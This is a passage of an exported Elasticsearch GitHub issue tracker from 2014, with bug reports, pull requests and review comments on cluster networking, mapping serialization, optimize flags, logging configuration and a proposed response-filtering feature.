It would be great to have a mocking framework or some easy way to get those kinds of Objects for testing purpose. Is there any already in place that I couldn't find?
</comment><comment author="dakrone" created="2014-09-02T07:57:41Z" id="54119930">@cfontes you should use an integration test for this instead of mocking everything out, see this test: https://github.com/elasticsearch/elasticsearch/blob/master/src/test/java/org/elasticsearch/search/functionscore/FunctionScoreFieldValueTests.java#L41 the bottom section has some try/catches that catch invalid queries.
</comment><comment author="cfontes" created="2014-09-02T08:20:53Z" id="54121816">@dakrone, thanks! I will!

Any thoughts on why that should be tested as part of an integration test? It looks like a simple case of method internal validations that looks good in a Unit test.

I don't want to be an ass or anything (sorry if it sounds like that...) just trying to understand the way you guys work.
</comment><comment author="dakrone" created="2014-09-02T08:29:07Z" id="54122528">@cfontes no problem at all :)

Usually it makes sense to integration test these sort of queries because you're testing for results returned instead of an exception being thrown, so having an integration framework where you can index some documents and check query results is useful.

You can get the parseContext by using the injector to get the IndexService and unit test it if you'd like also, here's an example of getting one: https://github.com/elasticsearch/elasticsearch/blob/master/src/test/java/org/elasticsearch/index/search/FieldDataTermsFilterTests.java#L76-L80 , however, just getting the injector means starting up nodes so an integration test works just as well for this. If you do want to add a unit test for this that would be great, but not required.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>One server mysteriously reporting as 127.0.0.1</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7407</link><project id="" key="" /><description>This has been happening for some time and I'm not entirely sure where to fix this. We've got a cluster of 17 right now. Viewing the list of nodes gives you the following:

``` bash
$ curl -s elastic1001:9200/_cat/nodes
elastic1003 10.64.0.110  51 35 5.22 d - elastic1003 
elastic1011 10.64.32.143 46 37 5.29 d - elastic1011 
elastic1004 10.64.0.111  70 35 2.01 d - elastic1004 
elastic1010 10.64.32.142 54 35 3.04 d - elastic1010 
elastic1008 127.0.1.1    65 35 3.18 d - elastic1008 
elastic1002 10.64.0.109  38 36 2.20 d * elastic1002 
elastic1005 10.64.0.112  71 35 3.07 d - elastic1005 
elastic1014 10.64.48.11  68 35 4.41 d m elastic1014 
elastic1012 10.64.32.144 69 37 4.23 d - elastic1012 
elastic1007 10.64.32.139 63 35 3.22 d m elastic1007 
elastic1006 10.64.0.113  66 35 2.82 d - elastic1006 
elastic1015 10.64.48.12  42 35 7.55 d - elastic1015 
elastic1017 10.64.48.39  39 35 6.23 d - elastic1017 
elastic1001 10.64.0.108  44 36 2.22 d - elastic1001 
elastic1016 10.64.48.13  54 35 5.28 d - elastic1016 
elastic1009 10.64.32.141 53 35 2.27 d - elastic1009 
elastic1013 10.64.48.10  51 35 5.71 d - elastic1013 
```

What's this? Elastic1008 reports itself as 127.0.01? Weird, it should be 10.64.32.140. Checking the /_nodes/ API concurs, so it's not an output issue in /_cat/ as far as I can tell.

 Couple of things I've already checked:
- Other nodes in the cluster all report that it's 127.0.0.1, including elastic1008
- Yes, elastic1008 has a proper IP, and it's the same eth0 interface
- We're not customizing any of the network settings for binding, etc.
- Startup logs for this host clearly show it binding to the non-loopback IP: [&amp;lt;timestamp&gt;][INFO ][http                     ] [elastic1008] bound_address {inet[/0:0:0:0:0:0:0:0:9200]}, publish_address {inet[/10.64.32.140:9200]}
- It's definitely serving traffic and all the other nodes are treating it properly
</description><key id="40914387">7407</key><summary>One server mysteriously reporting as 127.0.0.1</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">demon</reporter><labels /><created>2014-08-22T14:37:20Z</created><updated>2014-08-22T15:32:11Z</updated><resolved>2014-08-22T15:32:11Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="imotov" created="2014-08-22T15:19:35Z" id="53073706">When you run 

```
ping `hostname`
```

which IP address does it ping on the problematic node? What happens when you run the same command on some other node? Is /etc/hosts file any different on elastic1008?
</comment><comment author="demon" created="2014-08-22T15:32:11Z" id="53075488">That was it, and our operations just pointed me to this as well. Turns out we've had a long-standing issue with puppet setting up /etc/hosts on first run. All's resolved now, thanks.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Made original indices optional for broadcast delete and delete by query shard requests</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7406</link><project id="" key="" /><description>Shard requests like broadcast delete and delete by query, that needs to be executed on primary and all replicas, get read and written out to the transport on the same node. That means that if we add some field version checks are not enough to maintain bw comp since a newer node that holds the primary might receive the request from an older node, that didn't provide the field. Yet, when writing the request out again to a newer node that holds the replica, we do try and serialize the field although it's missing. The newer fields just needs to be set to optional in these cases, in addition to the version checks.

Re-enabled testDeleteByQuery and testDeleteRoutingRequired bw comp tests since this was the cause of their failures.
</description><key id="40912097">7406</key><summary>Made original indices optional for broadcast delete and delete by query shard requests</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>:Internal</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-22T14:13:35Z</created><updated>2015-06-07T19:03:05Z</updated><resolved>2014-08-23T15:02:03Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-23T14:55:42Z" id="53155128">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Force optimize was not passed to shard request</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7405</link><project id="" key="" /><description>The force flag to trigger optimiz calls of a single segment for upgrading
etc. was never passed on to the shard request.

Closes #7404
</description><key id="40908401">7405</key><summary>Force optimize was not passed to shard request</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>:Internal</label><label>bug</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-22T13:31:41Z</created><updated>2015-06-07T19:03:16Z</updated><resolved>2014-08-22T13:39:59Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-22T13:37:43Z" id="53060965">LGTM thanks!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Internal: Optimize#force() is not passed on to the shardrequest</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7404</link><project id="" key="" /><description>we have a force option to upgrade indices if there is even only a single segment. This setting is never passed on to the shardrequest.
</description><key id="40906654">7404</key><summary>Internal: Optimize#force() is not passed on to the shardrequest</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>bug</label><label>v1.2.5</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-22T13:08:33Z</created><updated>2014-09-08T15:06:47Z</updated><resolved>2014-08-22T13:39:59Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>[DOCS] Document the contracts of the RootMapper API.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7403</link><project id="" key="" /><description>Close #7400
</description><key id="40904379">7403</key><summary>[DOCS] Document the contracts of the RootMapper API.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">jpountz</reporter><labels /><created>2014-08-22T12:36:10Z</created><updated>2014-08-22T12:45:05Z</updated><resolved>2014-08-22T12:45:05Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-08-22T12:43:57Z" id="53055723">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add support for the field data loading option to the `_parent` field.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7402</link><project id="" key="" /><description>PR for #7394
</description><key id="40902589">7402</key><summary>Add support for the field data loading option to the `_parent` field.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/martijnvg/following{/other_user}', u'events_url': u'https://api.github.com/users/martijnvg/events{/privacy}', u'organizations_url': u'https://api.github.com/users/martijnvg/orgs', u'url': u'https://api.github.com/users/martijnvg', u'gists_url': u'https://api.github.com/users/martijnvg/gists{/gist_id}', u'html_url': u'https://github.com/martijnvg', u'subscriptions_url': u'https://api.github.com/users/martijnvg/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/580421?v=4', u'repos_url': u'https://api.github.com/users/martijnvg/repos', u'received_events_url': u'https://api.github.com/users/martijnvg/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/martijnvg/starred{/owner}{/repo}', u'site_admin': False, u'login': u'martijnvg', u'type': u'User', u'id': 580421, u'followers_url': u'https://api.github.com/users/martijnvg/followers'}</assignee><reporter username="">martijnvg</reporter><labels><label>:Parent/Child</label><label>bug</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-22T12:07:02Z</created><updated>2015-06-07T19:03:28Z</updated><resolved>2014-08-27T07:23:21Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-26T08:42:41Z" id="53391322">@martijnvg I think there is an issue with the serialization of the mapper that always serializes the fielddata settings. If I do this:

```
DELETE *

PUT test 
{
  "mappings": {
    "parent": {

    },
    "child": {
      "_parent": {
        "type": "parent"
      }
    }
  }
}

GET test/_mapping
```

Then I get

```
{
   "test": {
      "mappings": {
         "parent": {
            "properties": {}
         },
         "child": {
            "_parent": {
               "type": "parent",
               "fielddata": {
                  "loading": "eager"
               }
            },
            "properties": {}
         }
      }
   }
}
```

Although I should not get fielddata settings since those are the defaults?
</comment><comment author="jpountz" created="2014-08-26T08:44:21Z" id="53391479">(I think the issue comes from the fact that you initialize fielddataSettings to the defaults instead of `null` in the builder so customFieldDataSettings always ends up being non null.)
</comment><comment author="martijnvg" created="2014-08-26T09:18:12Z" id="53394923">@jpountz I see, I'll address that and make sure it only gets serialized when the loading is not equal to "eager".
</comment><comment author="martijnvg" created="2014-08-26T16:08:05Z" id="53445920">@jpountz I updated the PR.
</comment><comment author="jpountz" created="2014-08-26T16:58:03Z" id="53453171">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add `response_transform_script` to allow xpath style selection of response elements</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7401</link><project id="" key="" /><description>Our JSON responses are currently hard coded. If you only need one piece of information you need to retrieve, and parse, a fairly lengthy JSON document to get it. Although the browser is generally good at this, large responses create problems and require moving data over a, potentially slow, wire, only to throw it away immediately. It would be really nice to only get from the backend (Elasticsearch) the data that is required.

This issue has cropped up in a few places, eg #2149, #7350, #7330 each of which have slightly different requirements.  Instead of supporting multiple options to turn certain parameters on or off, it makes sense to provide a single generic solution that is flexible enough to solve all of these problems.

The best solution that we have found is to use [GPath](http://groovy.codehaus.org/GPath):

&gt; GPath is a path expression language integrated into Groovy which allows parts of nested structured data to be identified. In this sense, it has similar aims and scope as XPath does for XML.

We will add a `response_transform_script` parameter on all APIs (in the body or in the query string) which provides the full JSON response as a GPath object (eg `_response`) which can be manipulated at will. For instance, to return just the  `_source` fields from the `hits` array from a search request, you could do:

```
GET /_search
{
    "response_transform_script: {
        "script": "_json.hits.hits.collect { it._source }"
    }
}
```
</description><key id="40898581">7401</key><summary>Add `response_transform_script` to allow xpath style selection of response elements</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">clintongormley</reporter><labels><label>adoptme</label><label>feature</label></labels><created>2014-08-22T10:58:35Z</created><updated>2016-06-24T18:03:30Z</updated><resolved>2015-05-26T12:08:34Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-22T15:11:06Z" id="53072550">In fact, would be nice to support "path selection" in the same way as we do with [source filtering](http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/search-request-source-filtering.html)

Perhaps we should add a `_response` param which works like `_source`, and allows you to include/exclude paths (with wildcards).  The script option could then be run on the response body as it is after response filtering (if any).
</comment><comment author="X17" created="2015-02-04T11:24:00Z" id="72839130">@clintongormley 

Is this feature for retrieving data has been added ? 
</comment><comment author="rashidkpc" created="2015-03-03T15:45:43Z" id="76970343">With the removal of groovy by default I'm fine with something as simple as JSONPath
</comment><comment author="X17" created="2015-03-03T19:31:02Z" id="77016591">@rashidkpc  Hey, any progress ?? as it hampers the performance to filter metadata after retrieval.
</comment><comment author="gdeconto" created="2015-03-12T21:11:39Z" id="78618955">+1 on adding a feature that would allow me to remove the "_index", "_type", "_id" and "_score" fields from the output.  the output is needlessly bloated by this sort of chaff
</comment><comment author="hirenhcm" created="2015-05-11T20:31:11Z" id="101039349">Is this still under considerations. 

If not can some one share a way to remove the  _index, _type, _id and _score attributes from hits and get only the source Like:

``` javascript
hits:{
    [{ 
        name: 'Bruce'
        age: '70'
      }, { 
         name: 'Obie one'
         age: '79'
       }]
}
```
</comment><comment author="rjernst" created="2015-05-12T00:51:59Z" id="101083762">@hirenhcm See the linked PR #10980
</comment><comment author="bkdonline" created="2016-06-24T18:03:30Z" id="228417340">For the uninitiated: https://www.elastic.co/guide/en/elasticsearch/reference/current/common-options.html#_response_filtering
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>DocumentMapper never calls RootMapper.parse</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7400</link><project id="" key="" /><description>This is not an issue in practice since all our root mappers do actual stuff in preParse and postParse, but this might be surprising to someone writing an external root mapper.
</description><key id="40895615">7400</key><summary>DocumentMapper never calls RootMapper.parse</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/jpountz/following{/other_user}', u'events_url': u'https://api.github.com/users/jpountz/events{/privacy}', u'organizations_url': u'https://api.github.com/users/jpountz/orgs', u'url': u'https://api.github.com/users/jpountz', u'gists_url': u'https://api.github.com/users/jpountz/gists{/gist_id}', u'html_url': u'https://github.com/jpountz', u'subscriptions_url': u'https://api.github.com/users/jpountz/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/299848?v=4', u'repos_url': u'https://api.github.com/users/jpountz/repos', u'received_events_url': u'https://api.github.com/users/jpountz/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/jpountz/starred{/owner}{/repo}', u'site_admin': False, u'login': u'jpountz', u'type': u'User', u'id': 299848, u'followers_url': u'https://api.github.com/users/jpountz/followers'}</assignee><reporter username="">jpountz</reporter><labels /><created>2014-08-22T10:11:18Z</created><updated>2014-08-22T12:44:53Z</updated><resolved>2014-08-22T12:44:53Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>[Discovery] Added cluster version and master node to the nodes fault detecting ping request</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7399</link><project id="" key="" /><description>The cluster state version allows resolving the case where a old master node become unresponsive and later wakes up and pings all the nodes in the cluster, allowing the newly elected master to decide whether it should step down or ask the old master to rejoin.
</description><key id="40895247">7399</key><summary>[Discovery] Added cluster version and master node to the nodes fault detecting ping request</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bleskes</reporter><labels><label>enhancement</label><label>resiliency</label></labels><created>2014-08-22T10:05:37Z</created><updated>2014-08-22T10:05:59Z</updated><resolved>2014-08-22T10:05:59Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="bleskes" created="2014-08-22T10:05:59Z" id="53044095">Implemented on the improve_zen branch in 4316b9d5ca8508100a4677addaa8cd36e1afbe51
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Allow nullable queryBuilder in FilteredQueryBuilder to match rest api</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7398</link><project id="" key="" /><description>fix for #7365
</description><key id="40893135">7398</key><summary>Allow nullable queryBuilder in FilteredQueryBuilder to match rest api</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/jpountz/following{/other_user}', u'events_url': u'https://api.github.com/users/jpountz/events{/privacy}', u'organizations_url': u'https://api.github.com/users/jpountz/orgs', u'url': u'https://api.github.com/users/jpountz', u'gists_url': u'https://api.github.com/users/jpountz/gists{/gist_id}', u'html_url': u'https://github.com/jpountz', u'subscriptions_url': u'https://api.github.com/users/jpountz/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/299848?v=4', u'repos_url': u'https://api.github.com/users/jpountz/repos', u'received_events_url': u'https://api.github.com/users/jpountz/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/jpountz/starred{/owner}{/repo}', u'site_admin': False, u'login': u'jpountz', u'type': u'User', u'id': 299848, u'followers_url': u'https://api.github.com/users/jpountz/followers'}</assignee><reporter username="">brackxm</reporter><labels><label>:Java API</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-22T09:35:18Z</created><updated>2015-06-07T12:11:42Z</updated><resolved>2014-08-29T07:43:12Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-27T12:51:10Z" id="53567321">Thanks @brackxm the change looks good. Could you please sign our [contributor license agreement](http://www.elasticsearch.org/contributor-agreement/) so that I can merge this pull request? Thanks!
</comment><comment author="brackxm" created="2014-08-28T13:08:01Z" id="53716607">done
</comment><comment author="jpountz" created="2014-08-29T07:44:15Z" id="53846449">@brackxm merged, thanks!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>ScriptDocValues.GeoPoints enforces use of GeoDistance.ARC</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7397</link><project id="" key="" /><description>When an arc distance is requested, we should probably rather use the `sloppy_arc` distance which is as accurate and much faster.
</description><key id="40891604">7397</key><summary>ScriptDocValues.GeoPoints enforces use of GeoDistance.ARC</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">jpountz</reporter><labels><label>:Scripting</label><label>adoptme</label><label>enhancement</label><label>low hanging fruit</label></labels><created>2014-08-22T09:13:58Z</created><updated>2016-11-25T18:34:29Z</updated><resolved>2016-11-25T18:34:29Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2016-11-25T18:34:29Z" id="263009034">Closing in favour of https://github.com/elastic/elasticsearch/pull/19846</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Test: Use a dedicated port range per test JVM</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7396</link><project id="" key="" /><description>For reliability and debug purposes each test JVM should use it's own
TCP port range if executed in parallel. This also moves away from the
default port range to prevent conflicts with running ES instance on the local
machine.
</description><key id="40890896">7396</key><summary>Test: Use a dedicated port range per test JVM</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/s1monw/following{/other_user}', u'events_url': u'https://api.github.com/users/s1monw/events{/privacy}', u'organizations_url': u'https://api.github.com/users/s1monw/orgs', u'url': u'https://api.github.com/users/s1monw', u'gists_url': u'https://api.github.com/users/s1monw/gists{/gist_id}', u'html_url': u'https://github.com/s1monw', u'subscriptions_url': u'https://api.github.com/users/s1monw/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/973334?v=4', u'repos_url': u'https://api.github.com/users/s1monw/repos', u'received_events_url': u'https://api.github.com/users/s1monw/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/s1monw/starred{/owner}{/repo}', u'site_admin': False, u'login': u's1monw', u'type': u'User', u'id': 973334, u'followers_url': u'https://api.github.com/users/s1monw/followers'}</assignee><reporter username="">s1monw</reporter><labels><label>test</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-22T09:04:15Z</created><updated>2015-06-07T11:46:37Z</updated><resolved>2014-08-28T08:00:04Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-22T09:04:45Z" id="53038856">@javanna do you wanna take a look ?
</comment><comment author="javanna" created="2014-08-22T12:27:11Z" id="53054379">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Custom logger.yml location</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7395</link><project id="" key="" /><description>Adding the ability to specify an alternate logging configuration file via system property. Documentation updated.

Closes #2044
</description><key id="40885776">7395</key><summary>Custom logger.yml location</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">neowulf33</reporter><labels><label>:Settings</label></labels><created>2014-08-22T07:41:50Z</created><updated>2015-04-28T14:04:37Z</updated><resolved>2015-04-28T14:04:36Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="javanna" created="2014-11-12T17:44:54Z" id="62759806">Hi @neowulf33 thanks a lot for your PR and sorry it took a while to give you some feedback. I left a couple of inline comments, would you mind having a look and updating your PR according to those?

Could you also please sign our [CLA](http://www.elasticsearch.org/contributor-agreement/) so we can go ahead and merge this in once ready?
</comment><comment author="neowulf33" created="2014-11-17T20:45:27Z" id="63372510">Hi @javanna thank you for taking a look at my PR. I did sign the CLA a while ago.

I love this project and I would love to contribute more PRs. However, I am a bit concerned that this simple PR got reviewed after almost 3 months. I was digging around and I saw that there have been similar concerns that were asked of the ElasticSearch maintainers. Please see this for example:

[https://github.com/elasticsearch/kibana/issues/1251]

Are there steps being actively taken to increase the review rate of the community's contributions to the code base?

Thank you.
</comment><comment author="javanna" created="2014-11-18T12:36:32Z" id="63464457">Hi @neowulf33, I left a comment on testing, let me know if you need any further info to go ahead with this.

&gt; I did sign the CLA a while ago.

Did you sign it with the same email address that you use for github? I can't quite find it unfortunately.

&gt; Are there steps being actively taken to increase the review rate of the community's contributions to the code base?

Yes, we are working to do better.  We started "Fix it Fridays" for the project in an effort to bring more attention to outstanding PRs and small bugs.  We have quite a backlog now but are working through it, and hope to be more responsive in the future.
</comment><comment author="neowulf33" created="2014-11-27T11:24:00Z" id="64778422">Thanks @javanna for the additional feedback as well as the "Fix it Fridays" update. This is definitely a welcoming news for the community.

I have updated and pushed a new PR based on your feedback. I have also signed the CLA.
</comment><comment author="javanna" created="2014-11-27T13:11:08Z" id="64788568">Thanks a lot for updating your PR @neowulf33 and for coming up with a test for it, I left some comments, mainly around testing, but looks good! could you have a look and let me know if you have any question?

Also, @clintongormley can you double check the name for the new system property? Is `es.logging` ok with you?
</comment><comment author="neowulf33" created="2014-11-28T06:35:24Z" id="64859835">Hi @javanna - thank you for the feedback. Trust I have properly addressed them.
</comment><comment author="javanna" created="2014-11-28T11:30:57Z" id="64884619">Hi @neowulf33 thanks again for updating, I did another review round, it's getting closer ;)
</comment><comment author="javanna" created="2015-03-20T08:07:47Z" id="83946136">Hi @neowulf33 any progress on this? I can take this over and apply the changes suggested in the last review if you don't have time to do it, preserving your original commit to give you credit for the contribution. Thoughts?
</comment><comment author="neowulf33" created="2015-04-24T16:55:34Z" id="95991220">Hi @javanna please review the latest commit.
</comment><comment author="javanna" created="2015-04-28T14:04:35Z" id="97074374">Hi @neowulf33 thanks for updating the PR. We decided to move on with it but we would also like to apply some changes, like for instance move this new logic to the `Environment` class, which is the one that contains all the important paths. I am also working on tests and moving all the `File` mentions to `Path`. That is why I just opened #10852 that pulls in your changes and allows us to make some other additions to your PR. The first commit stays yours though, so we will attribute this contribution to you.

Superseded by #10852.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add option to eagerly build global ordinals for parent-child ID cache</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7394</link><project id="" key="" /><description>With a large number of children, building the global ordinals cache can represent a big performance hit on the first query after a refresh.

Adding eager global ordinals will improve that greatly.
</description><key id="40884125">7394</key><summary>Add option to eagerly build global ordinals for parent-child ID cache</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/martijnvg/following{/other_user}', u'events_url': u'https://api.github.com/users/martijnvg/events{/privacy}', u'organizations_url': u'https://api.github.com/users/martijnvg/orgs', u'url': u'https://api.github.com/users/martijnvg', u'gists_url': u'https://api.github.com/users/martijnvg/gists{/gist_id}', u'html_url': u'https://github.com/martijnvg', u'subscriptions_url': u'https://api.github.com/users/martijnvg/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/580421?v=4', u'repos_url': u'https://api.github.com/users/martijnvg/repos', u'received_events_url': u'https://api.github.com/users/martijnvg/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/martijnvg/starred{/owner}{/repo}', u'site_admin': False, u'login': u'martijnvg', u'type': u'User', u'id': 580421, u'followers_url': u'https://api.github.com/users/martijnvg/followers'}</assignee><reporter username="">clintongormley</reporter><labels><label>feature</label></labels><created>2014-08-22T07:08:37Z</created><updated>2014-08-27T07:23:22Z</updated><resolved>2014-08-27T07:23:22Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>dynamic template ignores index_options</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7393</link><project id="" key="" /><description>Hi All,
I'm using ES 1.2.2
 not sure what's happening here, but I have a mapping with a dynamic template specified like this:

```
"en_text":{
                    "path_match":"transcript.*.text",
                    "mapping":{
                        "dynamic":"true",
                        "type":"string",
                        "analyzer":"en_analyzer",
                        "index_options":"offsets",
                        "fields":{
                            "edge":{
                                "type":"string",
                                "index_analyzer":"edge_analyzer",
                                "search_analyzer":"icu_analyzer",
                                "index_options":"offsets"
                            }
                        }
                    }
                }
```

but after indexing, matching files end up with mappings like this:
../_mapping/field/transcript.en-GB.text

```
transcript.en-GB.text: {
full_name: "transcript.en-GB.text"
mapping: {
text: {
type: "string"
analyzer: "en_analyzer"
fields: {
edge: {
type: "string"
index_analyzer: "edge_analyzer"
search_analyzer: "icu_analyzer"
}-
}-
}-
}
```

I cant for the life of me get the index_options to take effect from a dynamic template, which of course breaks my highlighter :(

I find it hard to believe this is a bug, surely others are doing this?
Would love some insight, the same setting works just fine when specified in a property.
</description><key id="40883293">7393</key><summary>dynamic template ignores index_options</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">jeacott</reporter><labels /><created>2014-08-22T06:50:29Z</created><updated>2014-08-27T06:59:16Z</updated><resolved>2014-08-27T06:59:16Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jeacott" created="2014-08-27T06:59:16Z" id="53533359">well, this issue appears to be resolved in ES 1.3.2, so I'll close it.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Removed ConcurrentHashMapV8</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7392</link><project id="" key="" /><description>Basically reverting  #6400 as requested by @mikemccand

Closes #7296
